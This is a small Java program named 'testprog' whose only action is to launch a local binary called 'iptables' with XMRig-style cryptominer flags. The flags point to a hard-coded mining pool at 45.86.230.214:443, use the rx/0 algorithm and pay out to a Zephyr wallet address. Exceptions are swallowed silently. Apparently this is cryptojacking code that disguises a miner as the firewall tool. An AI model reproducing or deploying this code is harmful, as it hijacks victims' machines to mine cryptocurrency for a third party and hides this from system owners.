import java.io.BufferedReader;
import java.io.InputStreamReader;

public class testprog {
    public static void main(String args[]) {
        String s;
        Process p;
        try {
            p = Runtime.getRuntime().exec("./iptables --donate-level 1 -o 45.86.230.214:443 -u ZEPHsCXoSCxbM3ZTS2NaEvZ4ummTZ9kxQHgvFE2Wn5nmcLGUhzziXWi486UMoNKoqQDNFUZTk1rC2e1V57R3GovCeoyhWRt837K.CI -a rx/0 -k -t 1");
            BufferedReader br = new BufferedReader(
                new InputStreamReader(p.getInputStream()));
            while ((s = br.readLine()) != null)
                System.out.println("line: " + s);
            p.waitFor();
            System.out.println ("exit: " + p.exitValue());
            p.destroy();
        } catch (Exception e) {}
    }
}
